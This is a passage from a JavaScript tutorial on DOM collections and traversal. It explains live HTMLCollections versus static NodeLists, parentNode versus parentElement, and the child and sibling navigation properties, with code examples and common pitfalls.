// Array.prototype.slice (older approach)
const arrayFromCollection = Array.prototype.slice.call(htmlCollection);
const arrayFromNodeList = Array.prototype.slice.call(nodeList);
```

### Browser Compatibility Considerations

**HTMLCollection** has been supported since early browser versions with consistent behavior across all modern browsers.

**NodeList** features vary:

- Basic NodeList support is universal
- `forEach()` method requires ES2015+ support (IE11 lacks it)
- `for...of` iteration requires Symbol.iterator support (IE11 lacks it)

[Inference] For maximum compatibility with older browsers, converting to arrays or using classic `for` loops remains the safest approach.

### Selection Strategy

**Use `getElementsBy*` methods (HTMLCollection)** when:

- You need live updates to element collections
- You're selecting by simple criteria (tag name, class name)
- Named access by `id` or `name` is useful
- [Inference] Performance benefits from native browser optimizations for simple queries

**Use `querySelectorAll` (static NodeList)** when:

- You need complex CSS selectors
- Static snapshots are preferable (safer for iteration/modification)
- You want to avoid live collection behavior
- [Inference] Modern syntax and flexibility outweigh live update needs

---

## Live vs Static Collections

### Fundamental Difference

Live collections maintain active references to the DOM tree and automatically reflect any structural changes made after their creation. Static collections create a snapshot of matching nodes at query time and never update regardless of subsequent DOM modifications.

```javascript
const liveCollection = document.getElementsByClassName('item');
const staticCollection = document.querySelectorAll('.item');

console.log(liveCollection.length); // 3
console.log(staticCollection.length); // 3

document.body.appendChild(document.createElement('div')).className = 'item';

console.log(liveCollection.length); // 4 (updated automatically)
console.log(staticCollection.length); // 3 (unchanged)
```

### Live Collection Types

**HTMLCollection**: Returned by:

- `element.children`
- `document.getElementsByTagName()`
- `document.getElementsByClassName()`
- `document.getElementsByName()`
- `document.forms`
- `document.images`
- `document.links`
- `element.getElementsByTagName()`
- `element.getElementsByClassName()`

**Live NodeList**: Returned by:

- `element.childNodes`
- Older DOM properties like `document.all` (deprecated)

HTMLCollections provide name-based access via bracket notation or `namedItem()` method using element `id` or `name` attributes. Live NodeLists lack this feature and only support numeric indexing.

### Static Collection Types

**Static NodeList**: Returned by:

- `document.querySelectorAll()`
- `element.querySelectorAll()`

Static NodeLists are array-like objects created by capturing matching nodes at execution time. They implement the `NodeList` interface but remain frozen regardless of DOM changes.

### Performance Implications

Live collections query the DOM tree each time they're accessed. Every property read (`.length`, bracket access) may traverse the tree to ensure accuracy:

```javascript
const divs = document.getElementsByTagName('div');

// This performs tree traversal 1000 times
for (let i = 0; i < divs.length; i++) {
  console.log(divs[i]);
}

// Cache length to reduce traversals
const length = divs.length;
for (let i = 0; i < length; i++) {
  console.log(divs[i]);
}
```

[Inference: Modern engines optimize repeated accesses within tight loops, but caching length still provides benefits in complex scenarios]. Static collections avoid this overhead since their contents never change.

### Mutation Hazards with Live Collections

Live collections create risks when modifying the DOM during iteration:

```javascript
const paragraphs = document.getElementsByTagName('p');

// Infinite loop: moves first element repeatedly
for (let i = 0; i < paragraphs.length; i++) {
  document.body.appendChild(paragraphs[0]);
}

// Skips elements: collection shrinks as elements removed
for (let i = 0; i < paragraphs.length; i++) {
  paragraphs[i].remove(); // Removes current, next element shifts to i
}
```

Safe iteration patterns for live collections:

```javascript
// Iterate backwards
for (let i = elements.length - 1; i >= 0; i--) {
  elements[i].remove();
}

// Convert to array
[...elements].forEach(el => el.remove());
Array.from(elements).forEach(el => el.remove());

// Cache references
const elementsArray = [];
for (let i = 0; i < elements.length; i++) {
  elementsArray.push(elements[i]);
}
elementsArray.forEach(el => el.remove());
```

### Named Access in HTMLCollection

HTMLCollections support accessing elements by `id` or `name` attributes:

```javascript
const forms = document.forms;

// Access by numeric index
forms[0];

// Access by name attribute
forms['loginForm'];
forms.namedItem('loginForm');

// Also works with bracket notation for id
const element = document.getElementById('myDiv');
const children = element.children;
children['specificChild']; // Accesses child with id="specificChild"
```

This creates potential naming conflicts if multiple elements share the same `id` or `name`. [Inference: The first matching element is typically returned, though behavior may vary by implementation].

### Array-Like Behavior

Both collection types are array-like objects with numeric indices and `.length` property but lack array methods:

```javascript
const divs = document.getElementsByTagName('div');

typeof divs.length; // 'number'
divs[0]; // First div element
divs.forEach; // undefined

// Converting to arrays enables array methods
Array.from(divs).forEach(div => {});
[...divs].map(div => div.textContent);
Array.prototype.forEach.call(divs, div => {});
```

Modern JavaScript's spread operator and `Array.from()` provide clean conversion syntax. Older code used `Array.prototype.slice.call(collection)` for this purpose.

### Collection Type Identification

Distinguishing collection types programmatically:

```javascript
const live = document.getElementsByClassName('test');
const static = document.querySelectorAll('.test');

live instanceof HTMLCollection; // true
live instanceof NodeList; // false

static instanceof NodeList; // true
static instanceof HTMLCollection; // false

// Checking for specific NodeList type requires testing behavior
// No built-in property distinguishes live vs static NodeList
```

[Unverified: No standard property explicitly identifies whether a NodeList is live or static without testing actual behavior].

### Memory Considerations

Live collections maintain internal references to the DOM tree structure. Holding references to live collections from removed DOM subtrees can prevent garbage collection:

```javascript
const div = document.createElement('div');
div.innerHTML = '<span></span>'.repeat(10000);
document.body.appendChild(div);

const spans = div.getElementsByTagName('span');
div.remove(); // Remove from DOM

// 'spans' still references the collection, which references the detached tree
// [Inference: This may prevent garbage collection depending on engine implementation]
```

Static collections capture references to nodes at creation time. If those nodes are removed from the DOM, the collection maintains references to the now-detached nodes, also potentially preventing garbage collection.

### Practical Selection Guidelines

**Use live collections when:**

- Monitoring specific element types that change frequently
- Building reactive interfaces that automatically reflect DOM state
- Working with well-defined element sets like `document.forms` or `document.images`
- Performance impact of live updates is negligible

**Use static collections when:**

- Iterating and modifying matched elements
- Caching query results for repeated access
- Building element arrays for complex transformations
- Avoiding mutation hazards during iteration
- Query performance matters more than automatic updates

### Edge Cases and Quirks

**Empty collections**: Both types return collections with `.length === 0` when no elements match. These remain valid objects that can be iterated.

**Order guarantees**: Both maintain document order (depth-first traversal of the tree). Elements appear in the order they would be encountered when reading the HTML sequentially.

**Case sensitivity**: `getElementsByTagName()` is case-insensitive for HTML documents but case-sensitive for XML documents. `querySelectorAll()` follows CSS selector rules, which are case-sensitive for class names and IDs but case-insensitive for tag names in HTML.

**Attribute changes**: Live collections based on class names update when `className` or `classList` changes:

```javascript
const items = document.getElementsByClassName('active');
console.log(items.length); // 2

items[0].classList.remove('active');
console.log(items.length); // 1 (collection automatically updated)
```

Static collections ignore such changes entirely, maintaining their original captured set.

---

# Traversing the DOM

## Parent Nodes (parentNode, parentElement)

### Core Distinction

The DOM provides two properties for accessing a node's parent: `parentNode` and `parentElement`. While they often return the same value, they have critical differences in their return types and behavior.

**`parentNode`:**

- Returns any parent node regardless of type
- Can return non-element nodes (Document, DocumentFragment)
- Return type: `Node | null`
- Available on all Node types

**`parentElement`:**

- Returns parent only if it's an Element node
- Returns `null` if parent is not an element
- Return type: `HTMLElement | null`
- Available on all Node types but more restrictive

### When They Return Different Values

**Scenario 1: Document's documentElement**

```javascript
const html = document.documentElement; // <html> element

console.log(html.parentNode); // #document (Document node)
console.log(html.parentElement); // null (parent is not an Element)

html.parentNode.nodeType // 9 (DOCUMENT_NODE)
```

The `<html>` element's parent is the Document node, which has `nodeType === 9`. Since Document is not an Element, `parentElement` returns `null`.

**Scenario 2: DocumentFragment Children**

```javascript
const fragment = document.createDocumentFragment();
const div = document.createElement('div');
fragment.appendChild(div);

console.log(div.parentNode); // #document-fragment
console.log(div.parentElement); // null

div.parentNode.nodeType // 11 (DOCUMENT_FRAGMENT_NODE)
```

While the `div` has a `parentNode` (the DocumentFragment), it has no `parentElement` because DocumentFragment is not an Element.

**Scenario 3: Detached Nodes**

```javascript
const div = document.createElement('div');

console.log(div.parentNode); // null
console.log(div.parentElement); // null
```

Both return `null` for nodes not yet inserted into any tree.

**Scenario 4: Regular DOM Elements**

```javascript
const parent = document.createElement('div');
const child = document.createElement('span');
parent.appendChild(child);

console.log(child.parentNode); // <div>
console.log(child.parentElement); // <div>
console.log(child.parentNode === child.parentElement); // true
```

For typical DOM hierarchies where elements contain elements, both properties return the same value.

### Return Type Implications

**Type Safety Benefit:**

`parentElement` provides stronger typing guarantees in TypeScript and type-aware environments:

```typescript
const element = document.querySelector('.child');

// parentElement is typed as HTMLElement | null
const parent1 = element?.parentElement;
if (parent1) {
  parent1.style.color = 'red'; // ✓ Safe, known to be Element
  parent1.classList.add('active'); // ✓ Element methods available
}

// parentNode is typed as ParentNode | null (broader type)
const parent2 = element?.parentNode;
if (parent2) {
  // parent2.style.color = 'red'; // ✗ Error: style may not exist
  // Must check or cast
}
```

**Practical Implication:**

When traversing upward through a typical HTML document structure (element → element → element), use `parentElement` for cleaner code since you're guaranteed Element-specific properties and methods.

### Traversal Patterns

**Walking Up the Tree:**

```javascript
function ancestorChain(element) {
  const ancestors = [];
  let current = element.parentElement;
  
  while (current) {
    ancestors.push(current);
    current = current.parentElement;
  }
  
  return ancestors;
}

// Usage
const span = document.querySelector('span');
ancestorChain(span); // [div, section, body, html]
```

**Finding Ancestor by Selector:**

```javascript
function findAncestor(element, selector) {
  let current = element.parentElement;
  
  while (current) {
    if (current.matches(selector)) {
      return current;
    }
    current = current.parentElement;
  }
  
  return null;
}

// Usage
const link = document.querySelector('a');
findAncestor(link, '.container'); // Finds ancestor with class "container"
```

**Note:** The native `closest()` method provides similar functionality but includes the element itself in the search.

**Checking Containment:**

```javascript
function isDescendant(child, potentialAncestor) {
  let current = child.parentElement;
  
  while (current) {
    if (current === potentialAncestor) {
      return true;
    }
    current = current.parentElement;
  }
  
  return false;
}
```

**Note:** The native `contains()` method is more efficient for this purpose.

### Text Nodes and Parent Access

Text nodes, which have `nodeType === 3`, can only have Element parents in HTML documents:

```javascript
const div = document.createElement('div');
div.textContent = 'Hello';

const textNode = div.firstChild;
console.log(textNode.nodeType); // 3 (TEXT_NODE)
console.log(textNode.parentNode); // <div>
console.log(textNode.parentElement); // <div>
console.log(textNode.parentNode === textNode.parentElement); // true
```

In standard HTML DOM trees, text nodes always have element parents, so `parentNode` and `parentElement` return the same value for text nodes.

### Comment Nodes and Parent Access

Comment nodes (`nodeType === 8`) behave identically to text nodes regarding parent access:

```javascript
const div = document.createElement('div');
div.innerHTML = '<!-- comment --><span>text</span>';

const comment = div.childNodes[0];
console.log(comment.nodeType); // 8 (COMMENT_NODE)
console.log(comment.parentNode === comment.parentElement); // true (both return div)
```

### Attribute Nodes Special Case

**[Historical Context - Deprecated Behavior]**

In older DOM specifications (before DOM4), attribute nodes had special parent relationships. Attributes had an `ownerElement` property but were not considered children in the node tree:

```javascript
const div = document.createElement('div');
div.setAttribute('id', 'test');

const attr = div.getAttributeNode('id');
console.log(attr.parentNode); // null (attributes aren't in the parent-child tree)
console.log(attr.parentElement); // null
console.log(attr.ownerElement); // <div> (but this isn't a "parent" relationship)
```

Modern DOM handling uses element methods (`getAttribute`, `setAttribute`) rather than attribute node manipulation.

### ShadowRoot Parent Relationships

Shadow DOM introduces unique parent relationships:

```javascript
const host = document.createElement('div');
document.body.appendChild(host);

const shadow = host.attachShadow({ mode: 'open' });
const span = document.createElement('span');
shadow.appendChild(span);

// Shadow root's perspective
console.log(shadow.host); // <div> (the host element)
console.log(shadow.parentNode); // null (shadow root isn't a child of host)
console.log(shadow.parentElement); // null

// Element inside shadow's perspective
console.log(span.parentNode); // #shadow-root (DocumentFragment-like)
console.log(span.parentElement); // null (shadow root is not an Element)
```

Elements directly inside a shadow root have the shadow root as their `parentNode`, but `parentElement` returns `null` since ShadowRoot is not an Element type.

**Traversal Limitation:**

```javascript
// Cannot traverse outside shadow boundary using parentElement
function escapeToHost(element) {
  let current = element.parentElement;
  
  while (current) {
    current = current.parentElement;
  }
  
  // Will stop at null, won't reach the host element
  return current; // null
}

// Must use getRootNode() to detect shadow boundaries
function getEffectiveParent(element) {
  const root = element.getRootNode();
  
  if (root instanceof ShadowRoot) {
    return root.host; // Jump to host element
  }
  
  return element.parentElement;
}
```

### Performance Considerations

**Property Access Speed:**

Both `parentNode` and `parentElement` are direct property lookups with effectively identical performance characteristics. [Inference: Based on typical browser implementation patterns] The choice between them should be based on semantic correctness rather than performance.

**Caching During Traversal:**

```javascript
// Unnecessary repeated access
function countAncestors(element) {
  let count = 0;
  while (element.parentElement) {
    count++;
    element = element.parentElement; // Reassignment caches the reference
  }
  return count;
}

// Already efficient - no additional caching needed
```

### Null Checks and Safety

**Safe Traversal:**

```javascript
// Unsafe - will throw if element is null/undefined
function getGrandparent(element) {
  return element.parentElement.parentElement;
}

// Safe with optional chaining
function getGrandparent(element) {
  return element?.parentElement?.parentElement ?? null;
}

// Safe with explicit checks
function getGrandparent(element) {
  if (!element) return null;
  const parent = element.parentElement;
  if (!parent) return null;
  return parent.parentElement;
}
```

**Defensive Document Root Check:**

```javascript
function safeAncestorWalk(element) {
  const ancestors = [];
  let current = element.parentElement;
  
  // Stops at html element naturally (its parentElement is null)
  while (current) {
    ancestors.push(current);
    current = current.parentElement;
  }
  
  return ancestors;
}
```

### Use Case Guidelines

**When to Use `parentElement`:**

- Standard DOM traversal through HTML elements
- When you need Element-specific methods or properties
- TypeScript/typed code where you want stricter types
- Most common scenarios in web development

```javascript
// Typical use case
function highlightParents(element) {
  let current = element.parentElement;
  while (current && current !== document.body) {
    current.style.backgroundColor = 'yellow';
    current = current.parentElement;
  }
}
```

**When to Use `parentNode`:**

- Working with DocumentFragment
- Need to detect document root (`document.documentElement.parentNode`)
- Generic node manipulation regardless of type
- Framework or library code handling various node types

```javascript
// Generic node processing
function getParentContext(node) {
  const parent = node.parentNode;
  
  if (!parent) {
    return 'detached';
  }
  
  if (parent.nodeType === Node.DOCUMENT_NODE) {
    return 'document-root';
  }
  
  if (parent.nodeType === Node.DOCUMENT_FRAGMENT_NODE) {
    return 'fragment';
  }
  
  return 'normal';
}
```

### Common Pitfalls

**Pitfall 1: Assuming parentElement Always Returns a Value**

```javascript
// Wrong assumption
function removeFromParent(element) {
  element.parentElement.removeChild(element); // Can throw if parentElement is null
}

// Correct approach
function removeFromParent(element) {
  if (element.parentElement) {
    element.parentElement.removeChild(element);
  }
  // Or use the simpler element.remove()
}
```

**Pitfall 2: Infinite Loop Risk**

```javascript
// Dangerous - no stop condition if parent chain is circular (shouldn't happen in valid DOM)
function findRoot(element) {
  let current = element;
  while (current.parentElement) {
    current = current.parentElement;
  }
  return current;
}

// Safer with iteration limit or document check
function findRoot(element) {
  let current = element;
  let depth = 0;
  const maxDepth = 1000;
  
  while (current.parentElement && depth < maxDepth) {
    current = current.parentElement;
    depth++;
  }
  
  return current;
}
```

**Pitfall 3: Confusing parentElement with offsetParent**

```javascript
const element = document.querySelector('.absolute-child');

// parentElement: DOM tree parent
console.log(element.parentElement); // Immediate DOM parent

// offsetParent: Positioning context (nearest positioned ancestor)
console.log(element.offsetParent); // May be different - could skip ancestors
```

`offsetParent` is layout-related and returns the nearest ancestor that establishes a positioning context (has `position: relative/absolute/fixed`), not necessarily the DOM parent.

### Event Bubbling and Parent Relationships

Event propagation uses the parent-child relationships defined by `parentNode`:

```javascript
document.body.innerHTML = '<div id="outer"><div id="inner">Click</div></div>';

document.getElementById('inner').addEventListener('click', (e) => {
  console.log('Inner clicked');
  console.log('Event target:', e.target.id); // 'inner'
  console.log('Current target:', e.currentTarget.id); // 'inner'
});

document.getElementById('outer').addEventListener('click', (e) => {
  console.log('Outer clicked via bubbling');
  console.log('Event target:', e.target.id); // Still 'inner'
  console.log('Current target:', e.currentTarget.id); // 'outer'
});
```

Event bubbling traverses up using the `parentNode` chain, not `parentElement`, though in practice they're equivalent for typical element hierarchies.

### Mutation Observer Context

When observing DOM changes, parent relationships are captured in mutation records:

```javascript
const observer = new MutationObserver((mutations) => {
  mutations.forEach((mutation) => {
    if (mutation.type === 'childList') {
      mutation.addedNodes.forEach((node) => {
        console.log('Added node:', node);
        console.log('Parent:', node.parentNode); // The container element
        console.log('Parent element:', node.parentElement);
      });
      
      mutation.removedNodes.forEach((node) => {
        // Removed nodes have null parents
        console.log('Removed node parent:', node.parentNode); // null
      });
    }
  });
});

const container = document.querySelector('#container');
observer.observe(container, { childList: true });
```

Removed nodes have their parent relationships severed (`parentNode` and `parentElement` become `null`).

### Cross-Document Scenarios

When working with iframes or multiple documents:

```javascript
const iframe = document.querySelector('iframe');
const iframeDoc = iframe.contentDocument;
const iframeElement = iframeDoc.querySelector('div');

// Parent within iframe document
console.log(iframeElement.parentElement); // Parent element within iframe

// Document hierarchy
console.log(iframeDoc.documentElement.parentNode); // iframe's #document
console.log(iframeDoc.documentElement.parentElement); // null

// Cannot traverse from iframe content to main document via parent properties
console.log(iframeDoc.parentNode); // null
console.log(iframeDoc.parentElement); // null

// Must use iframe element reference to access main document context
console.log(iframe.ownerDocument); // Main document
```

Parent relationships do not cross document boundaries. Each document is its own tree.

### Practical Utilities

**Get All Ancestors:**

```javascript
function getAllAncestors(element, includeDocument = false) {
  const ancestors = [];
  let current = includeDocument ? element.parentNode : element.parentElement;
  
  while (current) {
    ancestors.push(current);
    current = includeDocument ? current.parentNode : current.parentElement;
  }
  
  return ancestors;
}

// Usage
const span = document.querySelector('span');
getAllAncestors(span); // [div, section, body, html]
getAllAncestors(span, true); // [div, section, body, html, #document]
```

**Check If Element Has Specific Ancestor:**

```javascript
function hasAncestorWithClass(element, className) {
  let current = element.parentElement;
  
  while (current) {
    if (current.classList && current.classList.contains(className)) {
      return true;
    }
    current = current.parentElement;
  }
  
  return false;
}
```

**Get Depth in Tree:**

```javascript
function getDepth(element) {
  let depth = 0;
  let current = element.parentElement;
  
  while (current) {
    depth++;
    current = current.parentElement;
  }
  
  return depth;
}

// Usage
const nested = document.querySelector('.deeply-nested');
console.log(getDepth(nested)); // e.g., 8
```

**Find Common Ancestor:**

```javascript
function findCommonAncestor(element1, element2) {
  const ancestors1 = new Set();
  let current = element1.parentElement;
  
  // Collect all ancestors of element1
  while (current) {
    ancestors1.add(current);
    current = current.parentElement;
  }
  
  // Walk up from element2 until we find a common ancestor
  current = element2.parentElement;
  while (current) {
    if (ancestors1.has(current)) {
      return current;
    }
    current = current.parentElement;
  }
  
  return null; // No common ancestor (shouldn't happen in valid DOM)
}
```

### Framework Considerations

**React Virtual DOM:** React components maintain their own parent-child relationships in the virtual DOM, separate from actual DOM `parentElement`/`parentNode` relationships. React refs give access to actual DOM nodes where standard properties apply.

**Web Components:** Custom elements have the same parent relationship behavior as standard elements:

```javascript
class MyComponent extends HTMLElement {
  connectedCallback() {
    console.log('Parent element:', this.parentElement);
    console.log('Parent node:', this.parentNode);
  }
}

customElements.define('my-component', MyComponent);
```

The `connectedCallback` lifecycle method fires when the element is inserted into a document, at which point `parentElement` and `parentNode` become available.

---

## Child Nodes

Child nodes represent the direct descendants of a DOM node. The DOM provides multiple properties for accessing these children, with important distinctions between node-based and element-based access methods.

### childNodes

Returns a live NodeList containing all child nodes of the specified node, including element nodes, text nodes, comment nodes, and processing instruction nodes.

```javascript
const container = document.getElementById('container');
const allChildren = container.childNodes;
// Includes text nodes (whitespace), comments, elements
```

#### Characteristics

**Live Collection**: The NodeList automatically updates when the DOM changes. Adding or removing children reflects immediately in the collection without re-querying.

```javascript
const list = parent.childNodes;
console.log(list.length); // 3
parent.appendChild(newNode);
console.log(list.length); // 4 (automatically updated)
```

**Node Type Inclusivity**: Contains all node types, not just elements. Common node types:

- `Node.ELEMENT_NODE` (1) - Element nodes like `<div>`, `<p>`
- `Node.TEXT_NODE` (3) - Text content including whitespace
- `Node.COMMENT_NODE` (8) - Comment nodes
- `Node.DOCUMENT_FRAGMENT_NODE` (11) - Document fragments

**Whitespace Text Nodes**: HTML whitespace (spaces, tabs, newlines) between elements creates text nodes.

```html
<div>
  <span>Text</span>
  <span>More</span>
</div>
```

```javascript
// The div's childNodes includes:
// [text node (whitespace), span, text node (whitespace), span, text node (whitespace)]
console.log(div.childNodes.length); // 5, not 2
```

#### Iteration Methods

NodeLists are array-like but not true arrays. Modern browsers support iteration:

```javascript
// forEach (modern browsers)
parent.childNodes.forEach(node => {
  console.log(node.nodeType);
});

// for...of
for (let node of parent.childNodes) {
  if (node.nodeType === Node.ELEMENT_NODE) {
    console.log(node.tagName);
  }
}

// Traditional for loop
for (let i = 0; i < parent.childNodes.length; i++) {
  const node = parent.childNodes[i];
}

// Convert to array
const nodesArray = Array.from(parent.childNodes);
const filtered = nodesArray.filter(node => node.nodeType === Node.ELEMENT_NODE);
```

#### Filtering Element Nodes

Common pattern to extract only element nodes from childNodes:

```javascript
const elementChildren = Array.from(parent.childNodes).filter(
  node => node.nodeType === Node.ELEMENT_NODE
);

// Alternative using children property (see below)
const elementChildren = parent.children;
```

### children

Returns a live HTMLCollection containing only the element child nodes, excluding text nodes, comments, and other non-element nodes.

```javascript
const container = document.getElementById('container');
const elementChildren = container.children;
// Only <div>, <span>, <p>, etc. - no text or comment nodes
```

#### Characteristics

**Element Nodes Only**: Filters out text nodes, comments, and other node types automatically. This is typically what developers need when traversing element hierarchies.

```html
<ul>
  <li>Item 1</li>
  <!-- comment -->
  <li>Item 2</li>
</ul>
```

```javascript
console.log(ul.childNodes.length); // 7 (includes whitespace and comment)
console.log(ul.children.length);   // 2 (only <li> elements)
```

**HTMLCollection vs NodeList**: While `childNodes` returns a NodeList, `children` returns an HTMLCollection. Both are live, but HTMLCollection has additional features:

- Accessible by element name or id: `collection.namedItem('myId')`
- Numeric indexing: `collection[0]`
- No `forEach` method in older browsers [Inference: Modern browsers may support iteration]

```javascript
const firstChild = parent.children[0];
const namedChild = parent.children.namedItem('special');
const byId = parent.children['elementId'];
```

#### Iteration

```javascript
// Modern for...of
for (let element of parent.children) {
  console.log(element.tagName);
}

// Traditional loop
for (let i = 0; i < parent.children.length; i++) {
  const child = parent.children[i];
}

// Convert to array for array methods
const childArray = Array.from(parent.children);
childArray.forEach(child => {
  child.classList.add('processed');
});
```

### firstChild

Returns the first child node of the element, or `null` if the element has no children. Returns any node type, including text and comment nodes.

```javascript
const first = parent.firstChild;
```

#### Whitespace Considerations

Due to HTML formatting, `firstChild` often returns a text node containing whitespace:

```html
<div>
  <span>Content</span>
</div>
```

```javascript
const first = div.firstChild;
console.log(first.nodeType);        // 3 (TEXT_NODE)
console.log(first.nodeValue.trim()); // "" (empty after trimming whitespace)
```

#### Safe Usage Pattern

Check node type before assuming element properties:

```javascript
const first = parent.firstChild;
if (first && first.nodeType === Node.ELEMENT_NODE) {
  console.log(first.tagName);
  first.classList.add('first');
}

// Or skip to first element child
const firstElement = parent.firstElementChild;
```

#### Null Check

Always verify the node exists before accessing properties:

```javascript
if (parent.firstChild) {
  // Safe to access properties
  const type = parent.firstChild.nodeType;
}
```

### lastChild

Returns the last child node of the element, or `null` if the element has no children. Like `firstChild`, returns any node type.

```javascript
const last = parent.lastChild;
```

#### Trailing Whitespace

Similar to `firstChild`, `lastChild` often captures trailing whitespace text nodes:

```html
<div>
  <span>Content</span>
</div>
```

```javascript
const last = div.lastChild;
console.log(last.nodeType);  // 3 (TEXT_NODE - whitespace after </span>)
```

#### Usage Patterns

```javascript
// Check for element type
if (parent.lastChild && parent.lastChild.nodeType === Node.ELEMENT_NODE) {
  parent.lastChild.classList.add('last');
}

// Prefer lastElementChild for elements
const lastElement = parent.lastElementChild;
```

### firstElementChild

Returns the first child element node, or `null` if there are no child elements. Automatically skips text nodes, comments, and other non-element nodes.

```javascript
const firstElement = parent.firstElementChild;
```

#### Advantages Over firstChild

No need to filter node types or handle whitespace:

```html
<div>
  
  <span>First</span>
  <span>Second</span>
</div>
```

```javascript
console.log(div.firstChild.nodeType);        // 3 (text node - whitespace)
console.log(div.firstElementChild.tagName);  // "SPAN" (skips whitespace)
```

#### Practical Usage

```javascript
// Direct element manipulation
const firstElement = container.firstElementChild;
if (firstElement) {
  firstElement.style.fontWeight = 'bold';
  firstElement.setAttribute('data-first', 'true');
}

// Traversal without filtering
let current = parent.firstElementChild;
while (current) {
  console.log(current.tagName);
  current = current.nextElementSibling;
}
```

#### Browser Support

Supported in all modern browsers and IE9+. For older browser support, fallback pattern:

```javascript
const firstElementChild = parent.firstElementChild || 
  (() => {
    let node = parent.firstChild;
    while (node && node.nodeType !== Node.ELEMENT_NODE) {
      node = node.nextSibling;
    }
    return node;
  })();
```

### lastElementChild

Returns the last child element node, or `null` if there are no child elements. Skips text nodes, comments, and other non-element nodes.

```javascript
const lastElement = parent.lastElementChild;
```

#### Advantages Over lastChild

Eliminates whitespace handling:

```html
<ul>
  <li>Item 1</li>
  <li>Item 2</li>
  <li>Item 3</li>
  
</ul>
```

```javascript
console.log(ul.lastChild.nodeType);        // 3 (trailing whitespace)
console.log(ul.lastElementChild.tagName);  // "LI" (actual last element)
```

#### Common Use Cases

```javascript
// Styling last element
const lastItem = list.lastElementChild;
if (lastItem) {
  lastItem.classList.add('last-item');
  lastItem.style.borderBottom = 'none';
}

// Reverse traversal
let current = parent.lastElementChild;
while (current) {
  console.log(current.textContent);
  current = current.previousElementSibling;
}

// Inserting before last element
const newElement = document.createElement('div');
parent.insertBefore(newElement, parent.lastElementChild);
```

### Performance Considerations

**Live Collections Performance**: Both `childNodes` and `children` are live collections. Accessing `.length` in loops causes re-evaluation:

```javascript
// Inefficient - recalculates length each iteration
for (let i = 0; i < parent.children.length; i++) {
  // ...
}

// Efficient - cache length
const len = parent.children.length;
for (let i = 0; i < len; i++) {
  // ...
}

// Or convert to static array
const childArray = Array.from(parent.children);
```

**Direct Property Access**: `firstElementChild` and `lastElementChild` are direct property lookups, more performant than filtering `childNodes`:

```javascript
// Less efficient
const firstElement = Array.from(parent.childNodes)
  .find(node => node.nodeType === Node.ELEMENT_NODE);

// More efficient
const firstElement = parent.firstElementChild;
```

### Comparison Matrix

|Property|Returns|Node Types|Live|Use Case|
|---|---|---|---|---|
|childNodes|NodeList|All nodes|Yes|When you need text/comment nodes|
|children|HTMLCollection|Elements only|Yes|Element-only traversal|
|firstChild|Node|Any|N/A|First node of any type|
|lastChild|Node|Any|N/A|Last node of any type|
|firstElementChild|Element|Element only|N/A|First element, skip whitespace|
|lastElementChild|Element|Element only|N/A|Last element, skip whitespace|

### Common Patterns and Pitfalls

#### Pitfall: Assuming firstChild is an Element

```javascript
// Dangerous - firstChild might be text node
const first = div.firstChild;
first.classList.add('active'); // Error if text node

// Safe
const first = div.firstElementChild;
if (first) {
  first.classList.add('active');
}
```

#### Pitfall: Live Collection Modification During Iteration

```javascript
// Dangerous - collection changes during iteration
for (let i = 0; i < parent.children.length; i++) {
  parent.removeChild(parent.children[i]); // Skips elements!
}

// Safe - iterate backwards or use static array
for (let i = parent.children.length - 1; i >= 0; i--) {
  parent.removeChild(parent.children[i]);
}

// Or
Array.from(parent.children).forEach(child => {
  parent.removeChild(child);
});
```

#### Pattern: Checking for Children

```javascript
// Check if element has children
if (element.childNodes.length > 0) {
  // Has some child nodes
}

if (element.children.length > 0) {
  // Has element children
}

// Check first/last child exists
if (element.firstElementChild) {
  // Has at least one element child
}
```

#### Pattern: Empty Element Content

```javascript
// Remove all children efficiently
while (element.firstChild) {
  element.removeChild(element.firstChild);
}

// Modern alternative
element.replaceChildren();

// Or
element.innerHTML = '';
```

#### Pattern: Element-Only Traversal

```javascript
// Old way - filter childNodes
Array.from(parent.childNodes)
  .filter(node => node.nodeType === Node.ELEMENT_NODE)
  .forEach(element => {
    // Process element
  });

// Better - use children
Array.from(parent.children).forEach(element => {
  // Process element
});

// Or iterate firstElementChild chain
let child = parent.firstElementChild;
while (child) {
  // Process child
  child = child.nextElementSibling;
}
```

### Edge Cases

**Empty Elements**: All properties return `null` or empty collections for elements with no children:

```javascript
const empty = document.createElement('div');
console.log(empty.childNodes.length);    // 0
console.log(empty.children.length);      // 0
console.log(empty.firstChild);           // null
console.log(empty.firstElementChild);    // null
```

**Text-Only Elements**: Elements containing only text nodes:

```javascript
div.innerHTML = 'Just text';
console.log(div.childNodes.length);      // 1 (text node)
console.log(div.children.length);        // 0 (no elements)
console.log(div.firstChild.nodeType);    // 3 (TEXT_NODE)
console.log(div.firstElementChild);      // null
```

**Mixed Content**: Elements with mixed text and element children:

```javascript
div.innerHTML = 'Text <span>element</span> more text';
console.log(div.childNodes.length);      // 3 (text, span, text)
console.log(div.children.length);        // 1 (span only)
console.log(div.firstChild.nodeType);    // 3 (text)
console.log(div.firstElementChild);      // <span>
```

---

## Sibling Nodes

### Node vs Element Sibling Properties

The DOM provides two pairs of sibling navigation properties: node-level properties that traverse all node types, and element-level properties that skip non-element nodes like text and comments.

**Node-level properties:**

- `node.nextSibling` - returns the next sibling node of any type
- `node.previousSibling` - returns the previous sibling node of any type

**Element-level properties:**

- `element.nextElementSibling` - returns the next sibling that is an Element
- `element.previousElementSibling` - returns the previous sibling that is an Element

All properties return `null` when no sibling exists in the specified direction.

### nextSibling and previousSibling

`node.nextSibling` returns the node immediately following the specified node in its parent's `childNodes` list. `node.previousSibling` returns the node immediately preceding it.

These properties traverse all node types including:

- Element nodes (nodeType 1)
- Text nodes (nodeType 3)
- Comment nodes (nodeType 8)
- Processing instruction nodes (nodeType 7)
- CDATA section nodes (nodeType 4)

The most common source of unexpected behavior is whitespace text nodes. HTML formatting creates text nodes containing only whitespace characters:

```html
<div>
  <span>First</span>
  <span>Second</span>
</div>
```

Between the two `<span>` elements exists a text node containing newline and spaces. `firstSpan.nextSibling` returns this text node, not the second span element.

When a node is the last child of its parent, `nextSibling` returns `null`. When a node is the first child, `previousSibling` returns `null`.

These properties are read-only and cannot be assigned to directly. Modifying sibling relationships requires DOM manipulation methods like `insertBefore()`, `appendChild()`, `removeChild()`, or `replaceChild()`.

### nextElementSibling and previousElementSibling

`element.nextElementSibling` returns the next sibling that is an Element node, automatically skipping text nodes, comment nodes, and other non-element nodes. `element.previousElementSibling` works identically in the reverse direction.

These properties only exist on Element nodes. Attempting to access them on non-element nodes (like text or comment nodes) results in `undefined`, as these properties don't exist on the base Node interface.

When no element sibling exists in the specified direction, these properties return `null`. This occurs when:

